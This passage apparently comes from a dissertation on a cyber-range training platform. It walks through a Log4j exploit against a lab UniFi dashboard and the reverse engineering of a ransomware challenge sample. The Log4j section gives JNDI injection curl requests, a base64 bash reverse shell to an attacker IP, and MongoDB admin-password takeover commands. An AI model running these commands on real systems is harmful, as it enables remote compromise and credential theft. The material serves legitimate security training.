ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
\end{lstlisting}

\subsubsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}

This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsgNoLookups\\=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.

% CA
At first, we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority, which is responsible for issuing the signed public-key digital certificates associated with a predefined domain name. Turning our created CA into trusted in the target device made it possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:

\lstset{
  language=bash,
  basicstyle=\ttfamily,
  showstringspaces=false,
  commentstyle=\color{red},
  keywordstyle=\color{blue}
}

\begin{lstlisting}[language=bash,caption=Generating an SSL Certificate for UniFi's dashboard.,numbers=none,label={lst:cmd_commands_unifi_ca}]
#!/bin/bash

# Generate CA keys (private and public keys)
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt

# Generating Certificate Signing Request (notice the subjectAltName, which is mandatory, at least in Firefox!)
openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"

# Generate Server Public-key Certificate
openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key

# Remove Password from server's private key
openssl rsa -in server.key -out server_nopass.key
\end{lstlisting}

The steps to load the certificates into the Docker container were as follows:

\begin{enumerate}
    \item Map the certificates folder path to the \texttt{/usr/lib/unifi/cert} volume exposed by the container.
    \item Insert in the certificates folder the PEM format SSL private key file corresponding to the SSL certificate under the name of \texttt{privkey.pem}.
    \item Insert also in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
\end{enumerate}

The private key file belonging to UniFi's dashboard domain was obtained in the final command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 

Furthermore, entry point scripts were changed to always reload SSL certificates inside the Docker container. This was not the default behavior, as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.

% Entrypoint Script

After the creation of the above-mentioned SSL certificates, the newly created root CA's public-key certificate is needed in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:

\begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.,numbers=none,label={lst:log4j_entrypoint_script}]
#!/bin/bash

cd "$( dirname "$0" )"

# UniFi Wizard Setup 

sleep 10
pip install -r requirements.txt
python3 setup.py

# Load new trusted root CA

cp /setup/ca.crt /usr/local/share/ca-certificates
update-ca-certificates

# Also in Firefox-Esr

cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
\end{lstlisting}

Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.

\begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
{
    "policies": {
      "Certificates": {
        "ImportEnterpriseRoots": true,
        "Install": [
          "ca.crt",
          "/setup/ca.crt"
        ]
      }
    }
  }
\end{lstlisting}

Listing \ref{lst:firefox_json_policies} presents the policies file, which is read on every Firefox's new execution.

% Selenium

After loading the SSL certificates, we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to instruct the behavior of the browser remotely. The tasks performed by Selenium can be summarized in:

\begin{itemize}
    \item Visiting UniFi's web dashboard page.
    \item Setting administrator credentials for accessing UniFi's web page. These were specified in the YAML format as custom variables of the vulnerable service in the scenario's specific variables.
    \item Clicking several wizard setup buttons to move onto more advanced setup stages.
\end{itemize}

\subsubsection{Exploit} \label{sec:validation_log4j_exploit}

The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, get the secret flag, and leverage access to get the administrative credentials on the UniFi MongoDB instance.

Initially, we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443, which is where UniFi's interface is.

\begin{lstlisting}[caption=Nmap output over victim machine.,numbers=none,label={lst:nmap_victim}]
# nmap -Pn example-domain.ui.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:52 UTC
Nmap scan report for example-domain.ui.com (172.152.0.1)
Host is up (0.000034s latency).
rDNS record for 172.152.0.1: edge_router.external_net
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
443/tcp  open  https
8443/tcp open  https-alt
MAC Address: 02:42:AC:98:00:01 (Unknown)
 
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
\end{lstlisting}

Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get the following page:

\begin{figure}[H]
    \includegraphics[width=15cm]{figures/unifi_initial_dashboard.png}
    \caption{UniFi's initial dashboard.}
    \label{fig:log4j_unifi_initial_dashboard}
\end{figure}

As mentioned earlier, we need to target a field we know will be logged by Apache Log4j using a malicious JNDI query. In our case, it is the \texttt{remember} field of the POST request.

\begin{lstlisting}[caption=UniFi Dashboard POST Request.,numbers=none,label={lst:unifi_post_request}]
POST /api/login HTTP/1.1
Host: example-domain.ui.com:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://example-domain.ui.com:8443
Content-Length: 76
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
 
{"username":"myuser","password":"mypassword","remember":false,"strict":true}
\end{lstlisting}

Then we must test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:

\begin{lstlisting}[caption=Issuing Malicious POST Request.,numbers=none,label={lst:unifi_malicious_post_request}]
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:9999/whatever}","strict":true}'
\end{lstlisting}

As we get a connection to port 9999 from the vulnerable Log4j container, the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 

The procedures to set up the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:

\begin{enumerate}
    \item Clone the Rogue JNDI tool and build the project into a JAR file using Maven.
    \item Generate the Base64 payload that will run in the victim's server. It connects to the attacker machine on port 4444, redirecting both the standard input and standard output to the remote machine so the attacker can have complete control over the victim.
    \item Running Rogue JNDI tool to create malicious LDAP and HTTP server with the command that will trigger a reverse shell.
    \item Issue cURL command with malicious JNDI query and run the exploit.
\end{enumerate}

\begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.,numbers=none,label={lst:unifi_clone_rogue_jndi}]
# Clone Rogue JNDI GitHub repository and build project
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

# Create the Base64 payload 
echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64

# Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwP
iYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"

# Running Exploit
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
\end{lstlisting}

As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command, we can see there is a weird file with the name \texttt{...} (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.

\subsubsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}

Some lateral movement can be performed after getting the reverse shell on the victim. For instance, we can try to crack the administrative credentials for the UniFi network application stored in the MongoDB instance mentioned earlier in the Docker container construction using \texttt{hashcat}. Or, we can add a new administrative user, for example. In an actual world setup, this would allow access to a whole new range of devices, possibly with vulnerabilities that would easily allow a way in. Persistence tasks could also be considered to enable consistent access to the victim's machine.

After getting the reverse shell prompt, we can first check if a MongoDB instance is running. We can run \texttt{ps aux | grep mongo}. The result will show port 27117 listening for incoming MongoDB connections. Then, we check which databases are available and get the contents of the \textit{admin} database.

\begin{lstlisting}[caption=Fetching Contents of MongoDB Admin Collection.,numbers=none,label={lst:unifi_mongodb_admin_contents}]
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.4.4
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.4.4
{
        "_id" : ObjectId("64750f87f19ea8014a2ceb6d"),
        "name" : "test_user",
        "email" : "admin@hotmail.com",
        "x_shadow" : "$6$msad4FLZ$WwZoWNYAGbcGY3bF8HVBQ.t.69dt/ogu1nsmeTjsorz4dBl3Q0Waoya35R.Gm0qEgPoVsUorIhVRVpoiG8cFo/",
        "time_created" : NumberLong(1685393287),
        "last_site_name" : "default"
}
\end{lstlisting}

Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email, and the password hash of the user, which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, cracking this hash to get the provided password would be possible. However, this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password and the \texttt{ObjectId} of the currently existing administrator.

\clearpage

\begin{lstlisting}[caption=Update Administrator User Account Password.,numbers=none,label={lst:unifi_mongodb_update_admin_password}]
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("64750f87f19ea8014a2ceb6d")},{$set:{"x_shadow":"$6$zsmtIX0rAM.G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
CqY5lAOLDNst3xfGQdX99GtpD0."}})'
\end{lstlisting}

The result is that now the \textit{test\_user} account has the newly replaced password \textit{mypassword}, and we can enter UniFi's network application and completely control it.

\subsection{Ransomware Scenario} \label{sec:validation_ransomware_scenario}

The Ransomware scenario is our first Windows-based scenario, opening the door to this new dissertation scope. There were some caveats in setting up this scenario. The initial idea was to combine both Linux scenarios and Windows scenarios. To maintain consistency in the overall project, we wanted to continue using containers. Still, since the development was based on a Linux host machine, and the underlying operating system resources and drivers used were also Linux-based, there was no way to create Windows containers. This happens because Docker is an OS-Level Virtualization and the Docker daemon provides each container the necessary kernel-level properties for it to be able to run. Due to this, Linux applications run on a Linux machine, and Windows applications run on a Windows platform. Still, there are exceptions in Windows due to the existence of \textit{Linux Subsystem}, making it possible for a Linux container to run on Windows. With this in mind, the solution we came up with was to use Linux containers with a KVM installed to run a Windows Vagrant box that would enable remote control. In the case of the Ransomware scenario, the malicious payload comes in the form of an executable (\texttt{.exe}) file, and having a Windows machine to run this script was the ideal situation. 

This challenge distinguishes itself compared to the other scenarios because it is not attack-oriented. The final goal stays the same, which is to get the secret flag. Still, this scenario is forensics-oriented in the sense that the trainee has to use a set of tools to debug the executable file, understand the consequences of executing the payload, and develop the reverse engineering skills necessary to get the flag.

\subsubsection{Windows Vagrant Box Inside Linux Docker Container} \label{sec:validation_windows_vagrant_inside_linux_docker}

As mentioned, one cannot run Linux and Windows containers simultaneously using the same Docker daemon. The solution to overcome this problem was to install a Windows virtual machine inside a Linux container. From the Docker daemon's perspective, all containers are Linux-based. Nonetheless, some of those containers run a hypervisor, on top of which there is a Windows Vagrant box. Considering that a VM inside a container takes more disk space than other containers, this process reveals itself as efficient in disk space compared to un-containerized VMs. Ultimately, the goal is to configure and access the Windows machine through Remote Desktop (RDP). One may ask: \textit{Why to install a VM inside a container?} This may seem strange to many since installing the VM directly on the base OS is always possible without needing an extra container layer. However, running a VM inside a container has advantages in spinning up multiple identical Windows VMs, saving tremendous resources (disk, RAM, and CPU).

When comparing a scenario where only a single VM runs directly on the base OS versus a scenario where the VM is containerized, we find both situations consume similar resources. For instance, a VM that takes 30GB of disk space will take 35GB on a containerized setup. If we run six copies of a VM, the occupied disk space increases to 180GB, as each copy takes the exact amount of disk space. The situation slightly differs in the case of six copies of containerized VMs. In Docker, there are two distinct concepts: images and containers. Images turn out to be read-only and are the core of containers that are created from a read-only layer, the image. On top of this read-only layer, they add their own read-write layer, which differs between containers. Considering the example provided above, where the Docker image size is 35GB when creating six containerized VMs, each container will only vary in its read-write layer interacting with the read-only image. Assuming this read-write layer has a size of 10GB, all six containers have a combined size of 60GB on top of the 35GB Docker image, making a total of 95GB.

RDP access was a desirable feature in these kinds of setups but contrary to what happens in Linux,  Windows containers cannot have a Desktop Environment. Instead, they are designed to run services and applications accessible using the PowerShell command line interface. Unlike Linux containers, where the Desktop Environment is an installable component, Microsoft ships Windows containers in a bundle directly with the OS. Microsoft published a set of known base images that form any Windows container's base. For them, there is no installable Desktop Environment component, meaning even if we opted for using Windows containers, the issue of not having the possibility of remotely controlling the UI would be present.

The architecture of the Vagrant box can be seen in Fig. \ref{fig:windows_vagrant_box_architecture}. 

\begin{figure}[H]
    \includegraphics[width=9cm]{figures/vagrant_box_container_diagram.pdf}
    \caption{Architecture Of Windows Vagrant Box Inside Docker Container.}
    \label{fig:windows_vagrant_box_architecture}
\end{figure}

This setup enabled a fully running Windows OS accessible through RDP and containerized and managed by Docker daemon. Five different technologies are worth mentioning:

\begin{itemize}
    \item \textbf{Base Operating System}, that will be the main hosting platform.
    \item \textbf{Docker Daemon}, which will handle the final Docker image (\textit{Ubuntu 18.04 Linux}) out of which we will spawn a container. The Docker image's main function is to run a hypervisor on which the Windows VM will run.
    \item \textbf{Hypervisor on the Docker Image} (\textit{KVM-QEMU}), which enables the installation and management of the Windows VM later on.
    \item \textbf{Windows VM}, the machine, a pre-packaged Windows 10 Vagrant box\footnote{\url{https://app.vagrantup.com/peru/boxes/windows-10-enterprise-x64-eval}}, we will be available through RDP.
\end{itemize}

The first step is to build the Docker image with the hypervisor installed. For this, we must ensure virtualization (VT-x) is enabled in the BIOS settings to launch the Virtual Machine. Then, in our \textit{Ubuntu 18.04 Linux} image, we first install the \textit{QEMU-KVM} hypervisor package and \textit{Libvirt}, which is an API library that manages KVM. Afterward, we map the \texttt{/dev/kvm} and \texttt{/dev/net/tun} devices in the host OS inside the container and the \texttt{/sys/fs/cgroup} directory in the host OS inside the container ensuring read-write permissions on it. Also, we make the container run in privileged mode, meaning it can access almost all resources the host OS can. Another vital topic worth mentioning is the installation of Vagrant, which is necessary to run the Windows VM. We then download the respective \textit{Vagrantfile}, which contains instructions on how to build the Vagrant box, whose size is about 5.6GB.

Setting up the right \textit{iptables} rules was a challenge. This is extremely important to ensure access to the RDP port on the Vagrant box from out of the container. By default, the Vagrant box configures firewall rules to allow access only from within the hypervisor container, meaning machines external to the hypervisor container do not have access to the Windows Vagrant box. As such, rules that redirect traffic from the base OS to the Vagrant box on RDP are needed. The logic followed is depicted in Fig. \ref{fig:vagrant_iptables_rules}.

\begin{figure}[H]
    \includegraphics[width=13cm]{figures/vagrant_iptables_rules.pdf}
    \caption{Schema of Vagrant \textit{iptables} Rules.}
    \label{fig:vagrant_iptables_rules}
\end{figure}

The inserted \textit{iptables} rules on the hypervisor container concerning NAT and port forwarding from the host OS to the container were:

\begin{itemize}
    \item Forward new TCP connections on ports 3389 (RDP), 5985 (PSRP HTTP), and 5986 (PSRP HTTPS) destined to the Windows VM.
    \item Add ``prerouting'' rule that changes destination packet address to the Windows VM on connections reaching ports 3389, 5985, and 5986.
    \item Add ``postrouting'' rule that changes source packet address to the hypervisor container on connections reaching ports 3389, 5985, and 5986.
    \item Forward established and related connections from and to the Windows VM.
    \item Reject every other kind of traffic from and to the Windows machine. Notice the previous rules take precedence over this rule.
\end{itemize}

These rules are sufficient for establishing RDP and PSRP (PowerShell Remoting Protocol) connections. The former is a protocol for remote desktop access, while the latter is a protocol that runs over WinRM. This remote management protocol uses a SOAP-based API for communication between the client and the server. Essentially, PSRP establishes remote sessions with the Windows machine, runs PowerShell commands and scripts on it, and receives the results back.

% Vagrant Box inside Linux with KVM installed (iptables, rdesktop)

The PSRP traffic redirection rules denote how to forward traffic from Ansible instructions destined for Windows machines. After we create the Windows VM, we need to configure it, so we intend to follow the same logic as previously and use Ansible to configure the Vagrant box remotely. This way, commands issued from the base OS go through the Linux hypervisor container using the above-mentioned \textit{iptables} rules and are redirected using NAT to reach the final target, the Windows VM box. This is possible using an SSH connection from the Ansible host machine to the hypervisor container, which will then redirect the traffic. Still, there are incompatibilities with these different remote access protocols between Linux and Windows: SSH and PSRP or WinRM. 

We use a PSRP Ansible connector that connects to Windows-based machines using the PSRP protocol to handle this. We could also have chosen a WinRM Ansible connector. Still, PSRP offers the possibility to use a SOCKS5 proxy, which is suited for handling connections of Windows hosts sitting behind a bastion, in our case, the hypervisor machine. So, our current setup uses two different Ansible connectors: the Docker one that connects to the Linux containers and the PSRP one that connects to the Windows VM.

In the above paragraph, we mentioned the SOCKS5 proxy, which routes traffic back and forth between two distinct actors, acting as a middleman between the two. Packets going through this proxy are not modified nor encrypted, only in cases where traffic is encrypted through an SSH connection, as it currently happens, from the Ansible host to the bastion host. This SOCKS5 proxy is needed to forward WinRM commands to the bastion host. As mentioned, SSH creates incompatibility issues as it is only suited for remote access commands on Unix-like systems.

Fig. \ref{fig:vagrant_kvm_host} shows a basic outline of the current configuration.

\begin{figure}[H]
    \includegraphics[width=13cm]{figures/vagrant_kvm_setup.pdf}
    \caption{Ansible Host, Hypervisor Container and Vagrant Box Architecture \cite{vagrant_kvm_host_ref}.}
    \label{fig:vagrant_kvm_host}
\end{figure}

The network boundaries included in this setup include the following:

\begin{itemize}
    \item \textbf{Ansible Host to the SOCKS Listener:}
        \begin{itemize}
            \item The Ansible host forwards data using the WinRM payload encapsulated in a SOCKS packet.
            \item A SOCKS5 proxy is set up in the Ansible host.
        \end{itemize}
    \item \textbf{SOCKS Listener to the SSH client:}
        \begin{itemize}
            \item Data from the SOCKS5 proxy is sent using an internal SSH channel.
        \end{itemize}
    \item \textbf{SSH Channel:}
        \begin{itemize}
            \item All data is encrypted using the SSH protocol.
        \end{itemize}
    \item \textbf{SSH Server to the WinRM Listener:}
        \begin{itemize}
            \item The bastion host, the hypervisor container, acts as the Ansible controller and sends the WinRM traffic to the Windows VM using port 5985 or 5986.
            \item The WinRM service in the Windows VM sees the bastion host as the source of the communication and has no idea of the SSH and SOCKS implementation behind it.
        \end{itemize}
\end{itemize}

Configuring the SSH proxy that exposes the SOCKS5 proxy to channel the WinRM requests through the bastion host is rather simple. The way to go is using SSH multiplexing with \textit{ControlMaster}:

\begin{lstlisting}[caption=SSH Proxy Exposing SOCKS5 Proxy.,numbers=none,label={lst:ssh_proxy_socks5}]
ssh -o "ControlMaster=auto" -o "ControlPersist=no" -o "ControlPath=~/.ssh/cp/ssh-%r@%h:%p" -CfNq -D 127.0.0.1:1234 kvm
\end{lstlisting}

The command in Listing \ref{lst:ssh_proxy_socks5} enables SSH multiplexing, which allows reusing an existing SSH connection to establish multiple sessions without needing to re-authenticate every time, saving resources. Without this, whenever a command is executed, the SSH client must establish a new TCP connection and a new SSH session with the remote host. A SOCKS5 proxy is also configured on port 1234. It creates a channel with the \textit{kvm} host, binding in the SSH configuration file for the hypervisor container, meaning our bastion host. After this is set up, we must configure which variables are associated with the hypervisor container in the Ansible environment.

\begin{lstlisting}[language=yaml,caption=Ansible Variables For The Hypervisor Container.,numbers=none,label={lst:ssh_proxy_socks5}]
"ansible_user": "administrator",
"ansible_password": "vagrant",
"ansible_connection": "psrp",
"ansible_psrp_protocol": "http",
"ansible_psrp_proxy": "socks5h://localhost:1234"
\end{lstlisting}

In Ansible means, we need the host machine to issue commands to the Windows VM as if there is no bastion host in the middle. We use the \texttt{ansible\_psrp\_proxy} variable that points to the SOCKS5 proxy server that we just specified in Listing \ref{lst:ssh_proxy_socks5}. Any commands sent through it will be redirected to the Windows VM. Regarding the \texttt{socks5h} scheme, the DNS resolution is made in the bastion host in the case of the hypervisor container.

\subsubsection{Scenario Construction} \label{sec:validation_ransomware_construction}

The Ransomware scenario is based on the FireEye Flare-On Challenge of the 2016 edition. A Ransomware attack employs encryption to hold a victim's information at ransom. The target user or organization's critical data, which includes files, databases, or entire applications, are encrypted, and a ransom is demanded to provide access. 

The Ansible construction of the scenario includes all the configurations presented in Section \ref{sec:validation_windows_vagrant_inside_linux_docker} and some little extras:

\begin{itemize}
    \item Copy of scenario files.
    \item Tool Installation:
    \begin{itemize}
        \item \textbf{IDA Free Version} - Popular tool that allows users to debug, disassemble and decompile binary files.
        \item \textbf{x64dbg} - Debugger and disassembler similar to IDA but designed mostly for Windows executables.
        \item \textbf{Process Explorer} - Provides detailed information on processes, modules, handles, and threads running in Windows.
        \item \textbf{Process Monitor} - Used for monitoring and capturing real-time system activity on Windows, including file system, registry, process, and network-related events.
        \item \textbf{PeStudio} - Software analysis tool designed for examining files in the Windows PE (Portable Executable) format.
        \item \textbf{Resource Hacker} - Tool that deals with analyzing, modifying, and extracting resources in Windows executable files.
    \end{itemize}
\end{itemize}

All these tools are installed by default in the Windows VM and are accessible to the trainee. As mentioned earlier, the VM is accessible through Remote Desktop, and the credentials for accessing it are \textit{vagrant:vagrant} or \textit{administrator:vagrant}.

\subsubsection{Reverse Engineering} \label{sec:validation_ransomware_solution}

The process of obtaining a solution to the challenge requires going through the reverse engineering process. The following descriptions include figures of low-level Assembly code, which should also be the focus of the trainee. We will start with basic static analysis and then move to code snippets.

Firstly, we present some of the information PeStudio gives us. The binary is not packed, meaning the program is not obfuscated and compressed, making the analysis process more straightforward. This can be checked in the binary sections with very low entropy. If we make a deeper inspection, we can see the existence of the ``Resource Section'', which, using Resource Hacker, shows an image. Using PeStudio, we can also find many imports related to Microsoft's Crypto API and other interesting imports associated with system parameters, loading resources, and finding files.

Moving on to the IDA analysis section, the challenge consists of two files: the malware executable and an encrypted file inside a folder named \textit{briefcase}. The first block of code after the \textit{main} function builds the ``briefcase'' Unicode string, as presented in Fig. \ref{fig:ida_1}. 

\begin{figure}[H]
    \includegraphics[width=8cm]{figures/ida_1.png}
    \caption{Construction of ``briefcase'' string and desktop directory path.}
    \label{fig:ida_1}
\end{figure}

The following system call is \textit{SHGetFolderPathW} and is identified by the CSIDL parameter pointing to the desktop directory. Then, the binary checks if the length of the desktop directory path is smaller than 248. If we do, the execution moves forward, concatenating the ``briefcase'' with the desktop path and storing it in a variable. This variable is then fed to the \textit{CreateFileW} call, checking for a directory named ``briefcase'' in the Desktop. If not, execution terminates. 

\begin{figure}[H]
    \includegraphics[width=12cm]{figures/ida_2.png}
    \caption{Debugger Trap on \textit{CloseHandle} call.}
    \label{fig:ida_2}
\end{figure}

Fig. \ref{fig:ida_2} shows the existence of a debugger trap because it may close a non-existent file handle in case of a dynamic analysis situation, and the debugging process immediately stops.

The next step is a \textit{GetVolumeInformationA} call fetching volume C's serial number. This value is compared against \texttt{0x7DAB1D35h}, as shown in Fig. \ref{fig:ida_3}, and means the malware targets a concrete machine that most likely doesn't match ours. If so, the execution terminates.

\begin{figure}[H]
    \includegraphics[width=6cm]{figures/ida_3.png}
    \caption{Comparison of \textit{GetVolumeInformationA} call with \texttt{0x7DAB1D35h}.}
    \label{fig:ida_3}
\end{figure}

To move forward in the analysis, we need to patch the binary but keep the result of the subroutine with \texttt{0x7DAB1D35h}, as this value will be later used in the execution. Fig. \ref{fig:ida_4} shows an example of the final patching.

\begin{figure}[H]
    \includegraphics[width=6cm]{figures/ida_4.png}
    \caption{Patched subroutine to always return \texttt{0x7DAB1D35h}.}
    \label{fig:ida_4}
\end{figure}

After the serial number check, the malware decodes a global variable using the above-mentioned serial number as a multi-byte XOR key. The final result string is ``thosefilesreallytiedthefoldertogether''. The next phase is related to starting the cryptography activities using Microsoft's Crypto API for file encryption. First, the malware hashes the above-mentioned long string using SHA-1, deriving an AES-256 symmetric key. Later, it recursively enumerates every file in the ``briefcase'' directory and encrypts them. It uses Cipher Block Chaining (CBC) mode, being the Initialization Vector, the MD5 of the lower-cased name and the extension of each file. After this value is set, two handles to the file are obtained: one for reading and one for writing. The read content goes through \textit{CryptEncrypt} function and is written back to the file in 16KB blocks.

After encrypting every file in the ``briefcase'' folder, the next step is to load the binary's resource, an image asking for a ransom, and set it as the Desktop's Wallpaper, as shown in Fig. \ref{fig:ida_5}.

\begin{figure}[H]
    \includegraphics[width=9cm]{figures/ida_5.png}
    \caption{Desktop Wallpaper.}
    \label{fig:ida_5}
\end{figure}

The trainee must decrypt a previously encrypted file inside the briefcase folder to find the secret flag. Given that the malware uses AES symmetric encryption, we can take advantage of the fact that the key used for encrypting files is the same as the one used for decrypting them. So, one possibility that is not so straightforward for solving the challenge is to patch the binary by replacing the \textit{CryptEncrypt} call for \textit{CryptDecrypt} by modifying the sample's Import Address Table (IAT) statically or at runtime using a debugger. The other possible solution that is publicly available in the project's open-source repository is a Python script that computes the decryption key of the AES algorithm being the SHA-1 hash of the string ``thosefilesreallytiedthefoldertogether'', taking into consideration Microsoft's \textit{CryptDeriveKey} inner workings\footnote{\url{https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey}}, plus the MD5 hash of the lowercase of the filename and extension as the Initialization Vector. The decrypted file content is then unpadded.

% Network Structure (No External Network)
% Ansible (WinRMI Connection, Playbooks, etc)
% FireEye Scenario
% Reverse Engineering With Process Monitor, Process Explorer, PeStudio, Resource Hacker, IDA, x86dbg
